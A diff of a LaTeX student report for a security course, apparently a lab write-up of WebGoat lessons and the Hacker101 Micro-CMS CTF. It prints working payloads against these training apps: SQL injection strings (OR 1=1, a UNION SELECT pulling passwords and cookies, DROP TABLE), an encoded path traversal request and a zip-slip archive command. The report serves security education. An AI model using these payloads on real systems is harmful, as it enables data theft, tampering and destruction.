@@ -2,23 +2,42 @@
 \usepackage[utf8]{inputenc}
 \usepackage{titling}
 
-% Images
-\usepackage{graphicx}
-\graphicspath{ {images/} }
-\usepackage{float}
+% Page size and margins
+\usepackage[a4paper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}
+
+% Language setting
+\usepackage[english]{babel}
+
+% Useful packages
+\usepackage{amsmath}
+\usepackage[colorlinks=true, allcolors=blue]{hyperref}
+\usepackage{minted}
 
 % Header
 \usepackage{fancyhdr}
 \pagestyle{fancy}
 \fancyhead{} % empties all fields
-\fancyhead[L]{IDATT2503 - Exercise 1}
 \fancyhead[R]{Francesca Grimaldi}
+\fancyhead[L]{IDATT2503 - Exercise 1}
+
+% Images
+\usepackage{graphicx}
+\graphicspath{ {images/} }
+\usepackage{float}
+
+% Tables
+\usepackage{tabu}
+\usepackage{caption} 
+\captionsetup[table]{skip=2pt}
+\usepackage[table]{xcolor}
+\usepackage{array}
 
 % Lists
 \usepackage{listings}
 \usepackage{enumitem}
 \setlist{topsep=2pt, itemsep=2pt, partopsep=2pt, parsep=2pt}
 
+% renew/new command
 \newcommand{\subtitle}[1]{%
   \posttitle{%
     \par\end{center}
@@ -27,24 +46,20 @@
 }
 
 % Title and info
-\setlength{\droptitle}{-10em}
-
 \title{%
-    % \vspace{4cm}
-    \huge Assignment 1
-}
+    \huge Assignment 1}
 
 \subtitle{%
     IDATT2503 - Security in programming and cryptography\\
     Fall 2023
-    % \vspace{7cm}
-}
+    }
 
 \author{%
   Francesca Grimaldi
 }
 
 \date{}
+
 
 \begin{document}
 
@@ -56,7 +71,8 @@
 % \tableofcontents
 
 
-% QUESTION 1
+
+% WEBGOAT
 \section{WebGoat}
 \subsection{A1 Broken Access Control}
 \subsubsection{Hijack a session}
@@ -67,7 +83,7 @@ The first half of it was a sequential number incrementing by two each time, whil
 I solved the challenge bruteforcing the values with a script.
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{hijack a session.png}
+    \includegraphics[width=0.9\textwidth]{img/hijack a session.png}
     \caption{Hijack a session}
     \label{fig:hijack_a_session}
 \end{figure}
@@ -81,7 +97,7 @@ The main focus of this lesson was on intercepting and manipulating requests and 
     Looking at the values displayed after clicking on \texttt{View Profile} and comparing them to the ones in the response, the missing ones were \texttt{role} and \texttt{userId}.
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.8\textwidth]{IDOR 3.png}
+        \includegraphics[width=0.8\textwidth]{img/IDOR 3.png}
         \caption{IDOR 3}
         \label{fig:idor_3}
     \end{figure}
@@ -93,13 +109,13 @@ The main focus of this lesson was on intercepting and manipulating requests and 
     As I managed to find the profile of 'Buffalo Bill', I edited a PUT request in order to modify it.
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.7\textwidth]{IDOR 5b.png}
+        \includegraphics[width=0.7\textwidth]{img/IDOR 5b.png}
         \caption{IDOR 5a}
         \label{fig:IDOR 5a}
     \end{figure}
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.9\textwidth]{IDOR 5.png}
+        \includegraphics[width=0.9\textwidth]{img/IDOR 5.png}
         \caption{IDOR 5b}
         \label{fig:IDOR 5b}
     \end{figure}
@@ -112,10 +128,10 @@ This lesson's objective was to use and manipulate Structured Query Language (SQL
 In the following, I included the SQL queries used to complete the various requests.
 \begin{itemize}
     \item[2)] {Simply required to retrieve the department of a specific employee from the employees table:\\
-    \texttt{SELECT department FROM employees WHERE (first\_name='Bob'\\ AND last\_name='Franco');}}
+    \texttt{SELECT department FROM employees WHERE (first\_name='Bob' AND last\_name='Franco');}}
     
     \item[3)] {Required Data Manipulation Language (DML) to change the department of an employee:\\
-    \texttt{UPDATE employees SET department='Sales' WHERE (first\_name='Tobi' AND last\_name='Barnett');}}
+    \texttt{UPDATE employees SET department='Sales' WHERE (first\_name='Tobi' AND \\ last\_name='Barnett');}}
     
     \item[4)] {Required Data Definition Language (DDL) to modify the schema and add a column to the table:\\
     \texttt{ALTER TABLE employees ADD phone varchar(20);}}
@@ -124,7 +140,7 @@ In the following, I included the SQL queries used to complete the various reques
     \texttt{GRANT SELECT ON grant\_rights TO unauthorized\_user;}}
     
     \item[9)] {Required to complete a query in order to retrieve the complete list of users:\\
-    \texttt{SELECT * FROM user\_data WHERE first\_name = 'John' and last\_name = 'Smith' or '1' = '1';}}
+    \texttt{SELECT * FROM user\_data WHERE first\_name = 'John' and last\_name = 'Smith' or \\'1' = '1';}}
     
     \item[10)] {First, one had to find the Input Field susceptible to SQL injection (\texttt{User\_Id}), and then take advantage of that to retrieve all the data.\\
     \texttt{Login\_Count: 1\\User\_Id: 1 OR 1=1}\\
@@ -135,7 +151,7 @@ In the following, I included the SQL queries used to complete the various reques
     \texttt{Employee Name: Smith\\Authentication TAN: 3SL99A' OR 1=1;--}}
     
     \item[12)] {Here, the task was to change the salary of an employee modifying a table with an injection on the \texttt{Authentication TAN} field:\\
-    \texttt{Employee Name: Smith\\Authentication TAN: 3SL99A'; UPDATE employees SET salary='99000' WHERE auth\_tan='3SL99A';--}}
+    \texttt{Employee Name: Smith\\Authentication TAN: 3SL99A'; UPDATE employees SET salary='99000' WHERE \\auth\_tan='3SL99A';--}}
     
     \item[13)] {Required deleting a table:\\
     \texttt{'; DROP TABLE access\_log;--}}
@@ -146,7 +162,7 @@ The goal of this lesson was to execute Blind SQL injection and combined SQL inje
 \begin{itemize}
     \item[3)] {The task required to retrieve all the contents of the \texttt{user\_system\_data} table through a field susceptible to SQL injection, and then find the password of an user called Dave.\\
     \textbf{1st step:} get all the data\\
-    \texttt{Name: Smith' UNION SELECT userid, user\_name, password, cookie, 'a', 'b', 1 FROM user\_system\_data;--}\\
+    \texttt{Name: Smith' UNION SELECT userid, user\_name, password, cookie, 'a', 'b', 1 \\ FROM user\_system\_data;--}\\
     The values \texttt{'a', 'b', 1} needed to be added as the UNION operator requires the same number of columns on both tables.\\
     \textbf{2nd step:} check the tuples and find the one with 'Dave' as \texttt{first\_name}\\
     In this case, the tuple was \texttt{105, dave, passW0rD, , a, b, 1}, and therefore \texttt{passW0rD} was the solution.}
@@ -158,13 +174,13 @@ The goal of this lesson was to execute Blind SQL injection and combined SQL inje
     I proceeded letter by letter with Burp Intruder, checking the response messages for a list of characters, until I found all of them.
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.6\textwidth]{SQL injection advanced 5b.png}
+        \includegraphics[width=0.6\textwidth]{img/SQL injection advanced 5b.png}
         \caption{SQL 5a}
         \label{fig:SQL 5}
     \end{figure}
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.6\textwidth]{SQL injection advanced 5.png}
+        \includegraphics[width=0.6\textwidth]{img/SQL injection advanced 5.png}
         \caption{SQL 5b}
         \label{fig:SQL 5}
     \end{figure}
@@ -193,10 +209,10 @@ Here, path (directory) vulnerabilities are exploited to access or store files ou
     I intercepted the POST request when updating the profile and changed the file name to \texttt{../mypicture}.}
     
     \item[5)] {The request was to find a file named \texttt{path-traversal-secret.jpg}.
-    I managed to do a GET request to\\\texttt{WebGoat/PathTraversal/random-picture?id=\%2e\%2e\%2f\%2e\%2e\%2fpath\\-traversal-secret}, and from the response I found out that I had to submit the SHA-512 hash of my username to solve the exercise.
+    I managed to do a GET request to\\\texttt{WebGoat/PathTraversal/random-picture?id=\%2e\%2e\%2f\%2e\%2e\%2fpath-traversal-\\secret}, and from the response I found out that I had to submit the SHA-512 hash of my username to solve the exercise.
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.7\textwidth]{SHA 512.png}
+        \includegraphics[width=0.7\textwidth]{img/SHA 512.png}
         \caption{Path traversal 5}
         \label{fig:SHA-512}
     \end{figure}
@@ -204,10 +220,11 @@ Here, path (directory) vulnerabilities are exploited to access or store files ou
     
     \item[7)] {This exercise required to overwrite my current profile image, circumventing a programming mistake made in the code to extract the zip file.
     I created a directory structure and a zip file with my image inside of it, with the commands:\\
-    \texttt{mkdir -p /home/webgoat/.webgoat-2023.4/PathTraversal/fragrimi}\\and \texttt{zip profile.zip ../../../../../../../../home/webgoat/\\.webgoat-2023.4/PathTraversal/fragrimi/fragrimi.jpg}.\\
+    \texttt{mkdir -p /home/webgoat/.webgoat-2023.4/PathTraversal/fragrimi}\\and \texttt{zip profile.zip ../../../../../../../../home/webgoat/.webgoat-2023.4/\\PathTraversal/fragrimi/fragrimi.jpg}.\\
     Uploading this zip file solved the assignment.}
 \end{itemize}
 
+% HACKER101
 \section{Hacker101}
 \subsection{Micro-CMS v1}
 For this web CTF, I found the four flags in the following way:
@@ -217,7 +234,7 @@ For this web CTF, I found the four flags in the following way:
     For most of them, it gave me a 404 error, but for one ID a \texttt{Private Page} appeared, with the flag.
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.7\textwidth]{micro CMS 1.png}
+        \includegraphics[width=0.7\textwidth]{img/micro CMS 1.png}
         \caption{microCMS 1}
         \label{fig:microCMS 1}
     \end{figure}
@@ -233,42 +250,44 @@ For this web CTF, I found the four flags in the following way:
     \item {With an SQL injection in the edit page, thus adding \texttt{';--} to the URL, the last flag appeared.}
 \end{itemize}
 
+% SCREENSHOTS
 \section{Screenshots}
 This section includes the screenshots of all the challenges marked as completed.
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed hijacking.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed hijacking.png}
     \caption{Completed Hijack a session}
     \label{fig:chas}
 \end{figure}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed IDOR.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed IDOR.png}
     \caption{Completed Insecure Direct Object References}
     \label{fig:cidor}
 \end{figure}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed SQL intro.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed SQL intro.png}
     \caption{Completed SQL (intro)}
     \label{fig:csqli}
 \end{figure}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed SQL advanced.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed SQL advanced.png}
     \caption{Completed SQL (advanced)}
     \label{fig:csqla}
 \end{figure}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed path traversal.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed path traversal.png}
     \caption{Completed Path traversal}
     \label{fig:cpt}
 \end{figure}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.7\textwidth]{completed/completed microCMS.png}
+    \includegraphics[width=0.7\textwidth]{img/completed/completed microCMS.png}
     \caption{Completed Micro-CMS v1}
     \label{fig:cmcms1}
 \end{figure}
+
 \end{document}
